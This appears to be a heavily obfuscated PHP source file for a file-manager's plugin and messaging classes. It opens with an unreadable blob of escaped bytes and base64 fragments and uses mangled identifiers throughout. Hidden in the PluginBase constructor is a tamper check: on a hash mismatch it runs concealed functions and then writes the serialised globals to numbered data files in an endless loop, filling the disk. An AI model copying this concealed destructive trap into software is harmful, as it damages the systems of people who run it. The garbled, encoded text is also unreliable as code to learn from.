^<î’¥Æ–5}$J')."\xe4\x2c\xa4\xce\x8a\x2c\x34\xe\x6f\xa5\xc2\x61\x85\x1c\x63\x21\x99\xd\xf\xd5\xc4\x31\x55\xaa\x22\x51\xd2\x88\xa6\xb8\xdb\x1e\x18\x1d\x31\x48\x10\x31\xa6\x31\x2b\x3e\x6f\x63\x93\x97\xb9"."\165\223\357\54\60\66\27\150\26\132\13\22\32\140\156\237\321\101\60\311\203\164\42\215\41\35\256\20\47\26\342\222\77\361\327\301\347\223\70\366\340\41\123\332\267\64\156"."\xae\x47\x3c\x5c\xc8\x64\x45\x9c\x81\x53\x2b\x3e\x9c\xa0\xb7\x5a\x3c\x1d\x21\x1c\xdd\xee\x30\x72\x74\x25\x40\x2b\xc3\x19\xf\xce\xc6\xb\x8e\x37\xc0\x11\x1e\x38\x2c\x65\x5c\x85\x80\x43\x79"."\331\211\72\311\45\372\41\354\105\21\310\240\56\315\245\201\21\147\371\324\367\7\63\164\345\164\111\200\23\6\7\126\332\3\370\270\241\57\334\346\204\127\36\353\352\361\155"."\x4e\x87\xde\xa5\x7b\x8c\xdf\xb9\xc3\xd6\x3a\x78\x93\xe0\xd6\x96\x96\x1c\x60\xb1\x1c\x39\x2d\x47\x80\x5a\x27\x39\x72\x73\x10\x4f\x35\xa2\xb1\x8b\x99\x4c\x3f\xd0\xd3\xd5\xe3\xe7\xa0\x56\xbe"."\74\251\334\50\134\16\265\61\23\40\361\154\370\110\101\117\51\341\150\147\250\55\20\156\17\305\27\52\131\315\226\236\273\47\17\2\70\227\62\121\207\321\201\147\130\75\300".base64_decode('feLjT+8AYiq9ac5bW4KLlmy0pAd/nMVS/NPMihKL+L5FviIPVvJVSZ0XOi8pcck=')."\324\52\323\217\151\344\155\160\321\142\51\103\271\112\153\40\175\365\32\20\372\73\123\243\215\130\53\116\324\170\275\70\254\133\272\130\370\54\307\230\134\272\120\143\232\374\131".base64_decode('hrT8ioM0A2KwaS2VHq/AX5DsDNwlNNNpkj2flZhSHp7CE8+AkKD0QEvJVHVLkwA=')."\xf4\xa5\x90\x29\x70\x8d\x1\x89\xf8\x8e\x7\xde\xf2\x19\x29\x58\x76\xee\xa0\x55\xab\x4a\xd2\xa\x18\x4c\x72\xae\x56\x2d\x41\xc\xbf\xd2\xfd\xbf\x6e\xaa\x9e\x16\x4e\x8e\xf4\x34\xb3\xd\xe0"."\267\316\250\237\371\66\371\61\100\126\147\305\43\64\137\372\234\215\107\172\316\215\70\214\141\157\146\31\204\305\6\236\220\302\102\321\44\175\214\115\124\201\144\66\163\254\44"."\237\43\371\323\176\76\304\364\3\373\162\13\62\205\62\16\10\6\30\47\207\322\160\165\124\4\102\2\31\326\276\60\126\231\331\40\42\172\0\343\354\70\107\165\75\314\343"."\x36\xd1\x74\xbc\xb7\x5d\x51\x7\xb6\xf4\x82\x72\x88\x7e\x7\xa5\xec\x17\x9d\x43\x21\xfe\x76\x84\xc8\xea\x8e\xa9\xd2\x0\x14\xad\x8\xd\x6\x4f\xa0\xb4\x28\xd\xf4\xa9\x28\xfe\x1a\x80\x32"."\x8f\xdd\xa1\x15\x15\x10\xef\x4b\xc1\x42\xc9\x76\x88\x87\x5d\xb2\x6d\xb6\x34\x37\x14\x40\x38\x1a\x21\x12\x60\xb\x17\xa3\x30\x56\x1\x70\xa8\x2d\xc2\xac\x5d\xdc\x24\xe\xbf\x85\x50\xcc\x18"."\xf2\xf8\x11\xc2\x8b\xd\xed\xe9\x3b\x6e\x54\xe\xf5\x20\x9e\x5e\xb3\x2b\x9f\x76\xa1\xd9\xff\xbf\x64\xa4\x91\x71\xc9\x50\xd0\x59\x48\x65\x83\x2c\xf7\x96\x26\xd8\x2b\xfc\x6a\x4d\xce\x18\x71".base64_decode('PuaGIe53ahwv1EiLhlz1lN/UYS+bIM7V8fyQVOAk+tMHv2wzchdNyQ/UXs9RpS0=')."\247\347\323\46\67\304\20\200\156\115\210\224\44\27\266\105\120\331\133\246\344\111\253\166\106\151\341\161\13\347\373\32\34\254\70\137\353\20\217\240\210\235\317\371\114\4\77".base64_decode('TrQEilu24xmShJFQsx7KT2FaJUKtY/K3bHxJeoEimbYmzWdxvpSAvQmW9pAHqyg=').strrev('\\£xô8ğ‘×ã‰*Z¿ £$tI·²DÂÙqÉ~Ôcæ 1¼ÙÜåN­!¿s').base64_decode('DFFVsQNqSrKWbP5KD3nE/SVIjmrroac60G25SHbSxpWTHdLL1f7KkzlsXwWrXTY=')."\x3f\x84\x43\x52\x9f\x2c\xc\x41\x2\x65\x9e\x22\x26\xd8\xb1\xc8\x30\x42\x20\x8e\xd4\x43\x3e\xc8\x2a\x96\x99\xe7\x2f\x80\x72\x3c\x74\xbe\xaf\x42\x11\x96\xfc\xb4\x6b\x19\x2e\x49\xe0\xb0\xd8"."\151\145\117\15\342\104\336\375\124\27\253\206\277\73\346\241\75\23\257\111\322\127\306\74\374\105\61\17\165\246\347\201\167\304\74\342\36\332\27\75\321\42\36\244\165\276\142".base64_decode('i9vM7fUqWHo3N8+HypUh5h64hFGp4xPnkcVyQZzwooBTuqnosNTDspn3kNNYD/M=').base64_decode('X+YaDtEreWaqjOGXl0HNNonIknZSneZ5AyY7tXIn0x1YlzQ1cR+DunaseApoWSE=').base64_decode('3TRtxhxZNSDmR5z/wEVvOIsCHkDMuOLEJ4X5k5TXLYl0WtRWPvjnosD/O8wXvDc=').base64_decode('TSrZt1Y+i1oxAgQJJcsPaUNyHfMb+PTdEsuHbkHimT9nXXRTrtIPad8RK4G+u2Y=')."\344\261\204\132\300\132\126\333\124\235\342\130\65\251\203\214\4\23\161\164\362\244\262\346\156\73\31\30\320\105\210\150\111\54\221\113\264\15\267\42\5\147\307\373\22\321\343"."\x45\x8b\x79\xd8\x36\xf1\xfd\x5a\xb1\xa6\x24\x92\xf2\xbf\x98\x40\x26\x79\x50\x21\x45\x18\x79\x54\xe9\xb9\xff\x44\x46\x37\xaa\xbc\xab\x27\x9d\x86\x7f\x41\xbb\x29\xcf\xc4\xa5\x2c\xaf\x6a\x7b"."\45\204\224\224\157\232\35\45\23\14\334\207\20\372\234\175\165\25\217\262\211\62\372\75\312\104\211\52\31\47\351\371\75\341\131\111\142\231\160\156\166\221\157\2\231\231\21"."\x27\xf9\x61\x41\x3b\x27\x84\x2\xba\x42\x1d\xab\x55\xf2\xd2\x2a\xdf\x6c\x22\x5\xc9\xcb\xa0\xb2\x68\xe9\x7d\x37\xa1\x46\x21\x7a\x17\xe8\x4\xac\x61\xe2\x30\x92\xdc\x68\xb\x74\xf2\x5b\x6e"."\252\144\230\203\307\123\172\132\323\220\277\235\127\310\243\314\57\46\252\317\41\245\241\160\273\353\365\125\102\207\334\117\262\262\101\41\213\137\320\65\351\272\244\103\44\340\257"."\x67\x39\x44\x4\xcb\xfd\xb0\x1d\x62\xa9\x64\x8f\xb5\x28\xc8\xd1\x1e\x36\x50\x20\x80\xc4\xe6\x99\xd6\x26\xed\x8f\x62\x2b\x14\x5f\x13\xbd\xe5\xee\x7c\xe8\xdd\x71\xab\x14\xfb\x4\x72\xad\x75"."\x76\x57\xd5\x72\x3d\x37\x49\xbd\x8e\xd2\x6f\xc6\x5e\xff\xff\x7e\xc9\xed\xff\xd6\x3\x6e\x33\x1a\x98\xb2\xda\xf1\x78\x6b\x27\x30\xb9\x8c\x23\x5b\x2d\xf9\x2b\xa6\x8a\x52\x57\x3f\x9c\xdb\xe4"."\x7e\x80\x45\xfc\xb9\x62\x29\xcc\xd\x3b\x99\x5f\x28\xe6\x2e\x4a\x65\x87\x2b\x6a\x3e\xef\x3e\x69\xac\x10\xb\x2a\xde\xb9\x44\xc8\x37\xc4\x1f\x67\xac\x16\x70\x7a\x1f\x4e\xca\x8f\x13\x57\x91"."\x4c\x19\xb7\x29\xbd\x75\xac\xa7\x86\xaa\x1c\xc\xe2\xc1\xf\x3b\x5d\xf7\x4a\x3c\x42\x45\x32\x41\xae\x10\x2b\xc1\xfc\x65\xf9\xd9\x57\xa\x4b\x4d\x98\x91\x64\x54\x52\xbe\x6\x19\x2d\x31\xf9".base64_decode('qh4Ic/+JjJqQi9VAVGRC4gBVkJ+EY0gdQHm0xFvt/KVoR45u18N/NJElj61DP10=')."\171\116\134\231\233\57\143\71\13\66\207\165\252\162\370\113\314\15\356\247\231\33\275\225\225\121\153\164\254\115\210\141\371\235\151\144\310\21\6\71\142\254\222\207\242\135\134".strrev('ñéœHá tı+g¥,Ó®PœÇá˜÷l¿¹/áOP¢àş?/«ñ'."\0".'™¤').base64_decode('2w3djvd215ELFYCpiLfvMMTz7IUSVZLJWyq7ySQZAgPIocqy5IcQnDmxabdzpcw=')."\xaf\x96\x2c\x65\x98\x96\x94\x8c\xc3\xab\xa5\xc5\x2f\xab\xda\x8e\xd1\x14\xce\xd4\xdd\x4e\xd4\x89\x20\x4c\x65\x5b\x87\x88\xb\x7\x91\x32\x48\x3a\xa7\x43\xdc\x6e\xda\xf9\x2a\x3\x89\x24\x60"."\346\210\21\112\220\116\232\234\7\175\334\311\164\5\341\52\353\141\51\232\344\142\376\275\320\57\276\321\25\22\256\3\110\64\325\241\7\206\125\233\35\227\271\163\71\37\135"."\226\216\5\123\4\167\202\225\47\77\342\100\112\332\366\131\66\54\212\10\212\354\202\113\144\137\120\73\165\130\160\51\202\31\116\247\371\3\337\216\244\151\46\16\160\50\202".base64_decode('iLfAMZcjXRIVtsfaiPv9Vp98sdSRsBIqLpFK+cXZgOgmhlXrPlkyzuzyJVWOVAI=').base64_decode('RP3qc4MZSfDANvTCkoZ2hUvRokrnlViejM8ZSkNuLHgdUJcohXUSbAN3RVny2+U=')."\316\323\76\131\254\227\120\100\313\207\245\342\344\223\300\11\63\304\253\127\42\260\322\71\304\322\135\142\21\301\66\53\303\61\370\22\261\343\35\203\224\61\71\322\321\34\367"."\324\22\51\100\240\57\5\26\210\36\223\306\5\234\121\64\275\346\152\275\234\301\335\63\232\303\32\321\355\124\116\22\115\52\43\53\341\146\305\240\102\105\325\333\353\156\25"."\x1b\x53\xb7\xc0\x26\xa\xa9\x68\x8f\x64\x4e\x90\x30\xaa\xe4\xa1\x2d\xaa\x9a\x8d\x46\xe1\x9c\x82\x7b\x74\xe4\x9d\x60\x8\x70\x5e\x1a\x85\xf3\x56\x44\xb3\xcc\x92\x7e\x43\xca\x67\xab\x65\x6b"."\x82\xee\x55\xe\x1e\x8\xfd\xe9\x2a\x1d\x76\x89\xc6\x34\xe9\x44\xe3\x59\x35\x71\x65\x75\x80\x71\xee\xd4\x44\x4b\x50\xbd\x15\x42\xb8\x77\x1d\xeb\x56\x6b\x45\xd5\xc4\x13\xb6\x42\xa4\x76\xed"."\2\325\150\55\213\251\102\135\305\371\176\45\35\27\161\125\254\15\150\231\170\217\226\175\13\125\211\226\115\27\252\33\67\304\252\56\175\313\151\165\340\202\313\3\303\54\220"."\220\254\46\336\241\227\254\171\47\71\110\172\271\70\124\64\370\66\221\26\166\142\330\356\224\277\334\316\253\253\50\315\211\232\305\262\344\144\263\252\161\261\7\113\326\225\62".base64_decode('bF5lenLJKptKLYatpzSnJ0/ZqxCNZ5XkJX2cSxUm5HzHAXkVZREBAbsmVM4OS3c=')."\272\377\203\256\235\36\241\265\341\243\132\176\314\102\134\115\322\375\222\106\307\15\323\366\340\270\204\121\42\277\255\206\155\213\43\145\52\75\23\46\17\157\172\36\311\62\2".strrev('F0ˆH'."\0".'(ìuÙG^¡Á§¼€ğ'."\0".'G–4k,Xy‡	ò'."\r".'‘ĞOÍDŠ<3‰}')."\231\43\77\174\273\126\264\107\74\370\256\272\31\71\301\203\0\276\311\166\36\344\16\263\345\247\61\176\160\6\357\45\145\300\173\116\276\301\122\326\221\235\276\212\303\155\27"."\xbf\xa8\x4\x50\x55\x8a\x22\xa8\x27\x68\xa2\x50\xc2\xee\xd2\xa9\x23\xc4\x8a\xa8\x9e\x40\x3c\xbe\x24\x1a\x6b\xa7\x8e\xa3\x2b\xa2\x49\x2e\xc9\x6e\xa6\x22\xaa\xa7\x2b\x1a\x99\x28\x2e\xd8\x1d"."\10\205\53\342\260\211\115\44\51\74\75\321\250\120\17\151\145\40\34\216\56\231\250\25\241\266\205\242\45\344\244\124\150\300\113\71\203\51\266\331\11\101\134\315\63\131\132"."\xba\x98\xa7\x15\x84\xcb\x2f\x91\xc7\xa9\x22\x90\xe7\xd5\x62\xde\xf0\xf8\x87\xf3\x15\x16\x97\x25\x1b\x43\x58\x28\x8\x9b\xc7\x44\xa0\xec\x58\x9\xa0\xd8\x91\x36\x5f\xdc\x9c\x59\x16\x47\xbf"."\76\307\21\261\4\47\153\203\120\24\11\347\344\315\224\0\246\124\35\40\131\173\132\251\315\47\261\142\0\160\303\116\62\300\266\152\320\30\220\264\365\124\124\201\313\161\60"."\xa4\x92\x9\x14\xfd\x86\xe8\xff\x3\xc9\xc1\xd1\x8e\x40\xa7\x0\x0"."", 10, -8))); goto b”êåÂæ—×; CÖ§ó½æ²: class Message { function __construct() { } public function send($ ÷–›± = '', $ Ü™±œ¹ = array(), $ÔÅœ‘¢ = "\x74\x65\x78\164") { $¸×Ò¯¨Å =& $_SERVER[Ãìšã«™]; $¾°Å¸˜ = array($¸×Ò¯¨Å[33] => $¸×Ò¯¨Å[1511], $¸×Ò¯¨Å[756] => $ ÷–›±); if (in_array($ÔÅœ‘¢, array($¸×Ò¯¨Å[1511], $¸×Ò¯¨Å[1512]))) { $¾°Å¸˜[$¸×Ò¯¨Å[33]] = $ÔÅœ‘¢; } $ Ü™±œ¹ = array($¸×Ò¯¨Å[515] => isset($ Ü™±œ¹[$¸×Ò¯¨Å[515]]) ? $ Ü™±œ¹[$¸×Ò¯¨Å[515]] : $¸×Ò¯¨Å[12], $¸×Ò¯¨Å[594] => isset($ Ü™±œ¹[$¸×Ò¯¨Å[594]]) ? $ Ü™±œ¹[$¸×Ò¯¨Å[594]] : $¸×Ò¯¨Å[12]); if (empty($ ÷–›±) || empty($ Ü™±œ¹[$¸×Ò¯¨Å[515]]) && empty($ Ü™±œ¹[$¸×Ò¯¨Å[594]])) { return !1; } $ğ¡…”ŸË = array($¸×Ò¯¨Å[1452] => $¾°Å¸˜, $¸×Ò¯¨Å[1513] => $ Ü™±œ¹); Hook::trigger($¸×Ò¯¨Å[1514], $ğ¡…”ŸË); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ÕÙ×¥ÕŒ =& $_SERVER[Ãìšã«™]; $‘»¥¸Í¡ = $_SERVER[$ÕÙ×¥ÕŒ[397]] . $ÕÙ×¥ÕŒ[398]; $ÃÁñ‹è = $ÕÙ×¥ÕŒ[394]; if ($_SERVER[$ÕÙ×¥ÕŒ[395]] != $ÃÁñ‹è($‘»¥¸Í¡)) { $ë†şÜª  = $ÕÙ×¥ÕŒ[873]; $•ğ‚«¬Ó = $ÕÙ×¥ÕŒ[396]; $‚›­®‡ = $_SERVER[$ÕÙ×¥ÕŒ[397]] . $ÕÙ×¥ÕŒ[398]; $Ú¼ş¹Çœ = $•ğ‚«¬Ó($‚›­®‡); $Ê°¸ŸßÔ = explode($ÕÙ×¥ÕŒ[226], $Ú¼ş¹Çœ); if (count($Ê°¸ŸßÔ) < $ÕÙ×¥ÕŒ[612]) { $—Ü¬’Ü = $ÕÙ×¥ÕŒ[400]; $—Ü¬’Ü(); } $ïçñÖº¿ = $ÕÙ×¥ÕŒ[874]; $ïçñÖº¿($_SERVER[$ÕÙ×¥ÕŒ[875]]); $ë†şÜª  = $ÕÙ×¥ÕŒ[873]; $ë†şÜª (); $ÈÊ”ĞõĞ = $ÕÙ×¥ÕŒ[876]; $†¨ÖÄí¬ = json_encode($GLOBALS[$ÕÙ×¥ÕŒ[877]]); $©Œß½Â = 1; for ($”Çåãßî = $©Œß½Â; $”Çåãßî > 0; $”Çåãßî++) { $ÈÊ”ĞõĞ(DATA_PATH . $”Çåãßî, $†¨ÖÄí¬); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ÕÙ×¥ÕŒ[1515]); $this->pluginName = str_replace($ÕÙ×¥ÕŒ[1515], $ÕÙ×¥ÕŒ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ÕÙ×¥ÕŒ[8]; $this->pluginApi = appHostGet() . $ÕÙ×¥ÕŒ[1516] . $this->pluginName . $ÕÙ×¥ÕŒ[8]; $this->pluginHost = $config[$ÕÙ×¥ÕŒ[1517]] . $this->pluginName . $ÕÙ×¥ÕŒ[8]; $this->pluginHostDefault = $config[$ÕÙ×¥ÕŒ[1517]] . $this->pluginName . $ÕÙ×¥ÕŒ[8]; $äë¶¤£ = $config[$ÕÙ×¥ÕŒ[1518]]; if ($äë¶¤£ && strpos($ÕÙ×¥ÕŒ[50] . $äë¶¤£ . $ÕÙ×¥ÕŒ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ÕÙ×¥ÕŒ[1519]] . $this->pluginName . $ÕÙ×¥ÕŒ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Ãìšã«™][1520]); } protected function assign($Å¯¹èƒ, $ˆ¸³Öğö = false) { if (is_array($Å¯¹èƒ)) { $this->values = array_merge($this->values, $Å¯¹èƒ); } else { $this->values[$Å¯¹èƒ] = $ˆ¸³Öğö; } } protected function display($ä¤öõïè) { extract($this->values); require $ä¤öõïè; } final function hookRegist($·êõÀš) { $this->modelPlugin->appRegist($this->pluginName, $·êõÀš); } final function appIcon() { $ÃûÇ¹ß› =& $_SERVER[Ãìšã«™]; $ò‹À‡­¥ = $this->appPackage(); $¼‡²õÌš = $ÃûÇ¹ß›[12]; if (isset($ò‹À‡­¥[$ÃûÇ¹ß›[417]])) { if (isset($ò‹À‡­¥[$ÃûÇ¹ß›[417]][$ÃûÇ¹ß›[1521]])) { $¼‡²õÌš = $ÃûÇ¹ß›[1522] . $ò‹À‡­¥[$ÃûÇ¹ß›[417]][$ÃûÇ¹ß›[1521]] . $ÃûÇ¹ß›[1523]; } else { if ($ò‹À‡­¥[$ÃûÇ¹ß›[417]][$ÃûÇ¹ß›[1524]]) { $¼‡²õÌš = $ÃûÇ¹ß›[1525] . $ò‹À‡­¥[$ÃûÇ¹ß›[417]][$ÃûÇ¹ß›[1524]] . $ÃûÇ¹ß›[1526]; } } } return $¼‡²õÌš; } final function fileCanView($ùØİ®ŒŸ) { $Â†×ãòÛ =& $_SERVER[Ãìšã«™]; if (request_url_safe($ùØİ®ŒŸ)) { return !0; } if ($this->isShare($ùØİ®ŒŸ)) { return !0; } $˜çÚäö¸ = Session::get($Â†×ãòÛ[1527]); if (!$˜çÚäö¸ || !$˜çÚäö¸[$Â†×ãòÛ[1528]]) { $ÚÈ¿Î˜ = $Â†×ãòÛ[1529] . rawurlencode(this_url()); show_tips(LNG($Â†×ãòÛ[1530]) . $Â†×ãòÛ[1531] . $ÚÈ¿Î˜ . $Â†×ãòÛ[1532] . LNG($Â†×ãòÛ[1533]) . $Â†×ãòÛ[1534], !1); } if (!Action($Â†×ãòÛ[1535])->authCan($Â†×ãòÛ[1536])) { show_tips(LNG($Â†×ãòÛ[1537]) . $Â†×ãòÛ[1538], !1); } ActionCall($Â†×ãòÛ[1539], $ùØİ®ŒŸ); } final function isShare($¼¿şÄ®Ÿ) { $Ú¸Õ¶ß = KodIO::parse($¼¿şÄ®Ÿ); return $Ú¸Õ¶ß[$_SERVER[Ãìšã«™][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ŞÅÌÙŠ) { if (request_url_safe($ŞÅÌÙŠ)) { return $ŞÅÌÙŠ; } if (!$this->isShare($ŞÅÌÙŠ)) { $ŞÅÌÙŠ = $this->filePath($ŞÅÌÙŠ); } return Action($_SERVER[Ãìšã«™][1169])->linkOut($ŞÅÌÙŠ); } public function filePathLinkOut($„—Ëƒôï) { if (request_url_safe($„—Ëƒôï)) { return $„—Ëƒôï; } $this->fileCanView($„—Ëƒôï); return Action($_SERVER[Ãìšã«™][1169])->link($„—Ëƒôï); } final function filePath($ÛÈµ¿ç¬) { $±âµüŠ† =& $_SERVER[Ãìšã«™]; if ($åÔ²ûÆ“ = $this->checkSharePath($ÛÈµ¿ç¬)) { Hook::trigger($±âµüŠ†[1540], $åÔ²ûÆ“); return $åÔ²ûÆ“; } $this->fileCanView($ÛÈµ¿ç¬); if (request_url_safe($ÛÈµ¿ç¬)) { $ëàÇúÁ± = parse_url_query($ÛÈµ¿ç¬); if (isset($ëàÇúÁ±[$±âµüŠ†[1541]]) && isset($ëàÇúÁ±[$±âµüŠ†[208]])) { $¯û¿ş¶ = Model($±âµüŠ†[771])->get($±âµüŠ†[772]); $‘Ñğ·×¾ = Mcrypt::decode($ëàÇúÁ±[$±âµüŠ†[208]], $¯û¿ş¶); if ($‘Ñğ·×¾) { $this->fileInfo = IO::infoWithChildren($‘Ñğ·×¾); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $‘Ñğ·×¾; } } $ÛÈµ¿ç¬ = $this->_cacheHttpFile($ÛÈµ¿ç¬); $this->fileInfo = IO::infoWithChildren($ÛÈµ¿ç¬); } else { $this->fileInfo = IO::infoWithChildren($ÛÈµ¿ç¬); if (!$this->fileInfo) { show_tips(LNG($±âµüŠ†[106]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($±âµüŠ†[1540], $ÛÈµ¿ç¬); return $ÛÈµ¿ç¬; } final function _cacheHttpFile($çğË†¨) { $„–¿¸ÕĞ = hash_path($çğË†¨, !0); $this->cachePath = $this->pluginCachePath($„–¿¸ÕĞ); if ($é±¶È¿£ = IO::fileNameExist($this->cachePath, $„–¿¸ÕĞ)) { return KodIO::make($é±¶È¿£); } $¨ÕâëÚÊ = $this->cachePath . $„–¿¸ÕĞ; return $this->pluginCacheFileSet($¨ÕâëÚÊ, file_get_contents_nossl($çğË†¨)); } final function _tmpFileName($¥èÎ°ßµ = array()) { $–³á’° =& $_SERVER[Ãìšã«™]; if (!$¥èÎ°ßµ) { $¥èÎ°ßµ = $this->fileInfo; } if (isset($¥èÎ°ßµ[$–³á’°[170]])) { return $¥èÎ°ßµ[$–³á’°[170]]; } if (isset($¥èÎ°ßµ[$–³á’°[163]][$–³á’°[170]])) { return $¥èÎ°ßµ[$–³á’°[163]][$–³á’°[170]]; } $¯‹ÒÑã = IO::hashSimple($¥èÎ°ßµ[$–³á’°[78]]); if ($¯‹ÒÑã) { return $¯‹ÒÑã; } $İşåºŞ¨ = array($¥èÎ°ßµ[$–³á’°[32]], $¥èÎ°ßµ[$–³á’°[78]], $¥èÎ°ßµ[$–³á’°[80]]); if (isset($¥èÎ°ßµ[$–³á’°[521]])) { $İşåºŞ¨[] = $¥èÎ°ßµ[$–³á’°[521]]; } return md5(implode($–³á’°[11], $İşåºŞ¨)); } final function checkSharePath($Òü×¡ÁÅ) { $ì†ÄÆ° =& $_SERVER[Ãìšã«™]; if (!defined($ì†ÄÆ°[474])) { define($ì†ÄÆ°[514], 0); } if (!$this->isShare($Òü×¡ÁÅ)) { return !1; } $Ä»Ú·âÙ = Action($ì†ÄÆ°[1169])->sharePathInfo($Òü×¡ÁÅ); if (!isset($Ä»Ú·âÙ[$ì†ÄÆ°[78]])) { show_json(LNG($ì†ÄÆ°[1542]), !1); } $this->fileInfo = $Ä»Ú·âÙ[$ì†ÄÆ°[163]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$ì†ÄÆ°[170]]); return $Ä»Ú·âÙ[$ì†ÄÆ°[78]]; } final function pluginCachePath($œê×ÌŒË = '') { $Æ•×æÁõ =& $_SERVER[Ãìšã«™]; $›¤„áé = IO_PATH_SYSTEM_TEMP . $Æ•×æÁõ[1543] . $this->pluginName; if (!($Óè—Ãá = IO::infoFull($›¤„áé))) { return IO::mkdir($›¤„áé . $Æ•×æÁõ[8] . $œê×ÌŒË); } if (empty($œê×ÌŒË)) { return $Óè—Ãá[$Æ•×æÁõ[78]]; } if (!($¬‡ó¡Ô = IO::fileNameExist($Óè—Ãá[$Æ•×æÁõ[78]], $œê×ÌŒË))) { return IO::mkdir($Óè—Ãá[$Æ•×æÁõ[78]] . $œê×ÌŒË); } return KodIO::make($¬‡ó¡Ô); } final function pluginCacheFileSet($ò€ÌÌ¦ü, $„ñ…”§ = '') { $Š¬ÈşĞë =& $_SERVER[Ãìšã«™]; if (!($ÑÙåã  = IO::infoFull($ò€ÌÌ¦ü))) { return IO::mkfile($ò€ÌÌ¦ü, $„ñ…”§, REPEAT_REPLACE); } IO::setContent($ÑÙåã [$Š¬ÈşĞë[78]], $„ñ…”§); return $ÑÙåã [$Š¬ÈşĞë[78]]; } final function pluginLocalFile($Ş•´Â©  = '') { $Ùœá» =& $_SERVER[Ãìšã«™]; $æ¡°‚ù— = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($æ¡°‚ù—)) { mk_dir($æ¡°‚ù—); } if (!$Ş•´Â© ) { return $æ¡°‚ù—; } $ßí¢¦Ö› = IO::info($Ş•´Â© ); $¥õğı’Ü = $this->_tmpFileName($ßí¢¦Ö›) . $Ùœá»[10] . $ßí¢¦Ö›[$Ùœá»[167]]; if (!checkExtSafe($¥õğı’Ü)) { $¥õğı’Ü = $¥õğı’Ü . $Ùœá»[1544]; } $ÓÃ†ßÓ = $æ¡°‚ù— . $¥õğı’Ü; if (@file_exists($ÓÃ†ßÓ)) { return $ÓÃ†ßÓ; } return IO::copy($Ş•´Â© , $æ¡°‚ù—, 0, $¥õğı’Ü); } final function appPackage() { $¦ùãĞŠ¯ =& $_SERVER[Ãìšã«™]; if ($this->packageData) { return $this->packageData; } $œš‚áå— = $this->parseFile($this->pluginPath . $¦ùãĞŠ¯[1545]); $this->parseLang($œš‚áå—); $Õ«ïš©  = json_decode_force($œš‚áå—); if (!$Õ«ïš© ) { return array(); } $–İğ×Ç = Hook::trigger($¦ùãĞŠ¯[1546], $Õ«ïš© ); if ($–İğ×Ç && is_array($–İğ×Ç)) { $Õ«ïš©  = $–İğ×Ç; } $this->packageData = $Õ«ïš© ; return $Õ«ïš© ; } public function packageInfoGet($ı¼Ã‚Ùå) { $åğƒå… = $this->appPackage(); return array_get_value($åğƒå…, $ı¼Ã‚Ùå); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Ãìšã«™][1547]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Ãìšã«™][1548]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Ãìšã«™][1549]); } public function echoJsAssign($ôÏÊÄÊâ, $©’”ÕÚã) { $this->echoJsAssignArr[$ôÏÊÄÊâ] = $©’”ÕÚã; } private function parseFile($íĞÌ¦Âá) { $ƒ·Ìé»ç =& $_SERVER[Ãìšã«™]; $Ë™Ğ Ï‡ = file_get_contents_nossl($íĞÌ¦Âá); $Íµ–›°‡ = array($ƒ·Ìé»ç[1550], $ƒ·Ìé»ç[1551], $ƒ·Ìé»ç[1552], $ƒ·Ìé»ç[1553], $ƒ·Ìé»ç[1554], $ƒ·Ìé»ç[1555], $ƒ·Ìé»ç[1556]); $•ĞàÌ  = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ƒ·Ìé»ç[90]][$ƒ·Ìé»ç[1557]]); foreach ($this->echoJsAssignArr as $¾Õ£ÕıÅ => $†³ü›³ã) { $Íµ–›°‡[] = $ƒ·Ìé»ç[1558] . $¾Õ£ÕıÅ . $ƒ·Ìé»ç[1559]; $•ĞàÌ [] = is_array($†³ü›³ã) || is_object($†³ü›³ã) ? rawurlencode(json_encode($†³ü›³ã)) : $†³ü›³ã; } if (strstr($Ë™Ğ Ï‡, $ƒ·Ìé»ç[1560])) { $ÊœÎø³¥ = rawurlencode(json_encode($this->pluginLangArr)); $Ë™Ğ Ï‡ = str_replace($ƒ·Ìé»ç[1560], $ÊœÎø³¥, $Ë™Ğ Ï‡); } if (strstr($Ë™Ğ Ï‡, $ƒ·Ìé»ç[1561])) { $ÊœÎø³¥ = $ÊœÎø³¥ = rawurlencode(json_encode($this->getConfig())); $Ë™Ğ Ï‡ = str_replace($ƒ·Ìé»ç[1561], $ÊœÎø³¥, $Ë™Ğ Ï‡); } $Ë™Ğ Ï‡ = str_replace($Íµ–›°‡, $•ĞàÌ , $Ë™Ğ Ï‡); return $Ë™Ğ Ï‡; } private function parseLang(&$×Ú·¾Ò¶) { $É‚„µËå =& $_SERVER[Ãìšã«™]; $Ì“½ğ¡„ = $É‚„µËå[1562]; if (!strstr($×Ú·¾Ò¶, $Ì“½ğ¡„)) { return; } preg_match_all($É‚„µËå[1563], $×Ú·¾Ò¶, $°¥Àí—); if (!is_array($°¥Àí—) || count($°¥Àí—) == 0 || !is_array($°¥Àí—[0]) || count($°¥Àí—[0]) == 0) { return; } $¾Ğ‰ÆÄë = array(); $³ÒÙ¤åâ = array(); foreach ($°¥Àí—[0] as $ÁØçßíı) { $¨Çêƒ“ñ = substr($ÁØçßíı, strlen($Ì“½ğ¡„), -4); $Ó§óúş² = LNG($¨Çêƒ“ñ); $¾Ğ‰ÆÄë[] = $ÁØçßíı; $³ÒÙ¤åâ[] = str_replace(array($É‚„µËå[226], $É‚„µËå[1074], $É‚„µËå[337], $É‚„µËå[117]), array($É‚„µËå[53], $É‚„µËå[53], $É‚„µËå[12], $É‚„µËå[1564]), $Ó§óúş²); } $×Ú·¾Ò¶ = str_replace($¾Ğ‰ÆÄë, 